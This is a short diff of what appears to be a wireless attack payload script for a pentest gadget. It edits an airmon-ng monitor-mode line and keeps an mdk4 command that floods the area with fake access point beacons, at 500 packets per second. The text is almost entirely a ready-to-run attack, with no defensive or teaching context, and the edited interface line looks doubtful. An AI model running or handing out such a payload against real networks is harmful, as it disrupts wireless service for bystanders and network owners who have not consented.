@@ -6,6 +6,6 @@
 # Version: 1.0
 
 LED SETUP
-airmon-ng start wlan0
+airmon-ng start wlan0mon
 LED ATTACK
 mdk4 wlan0mon b -a -m -s 500
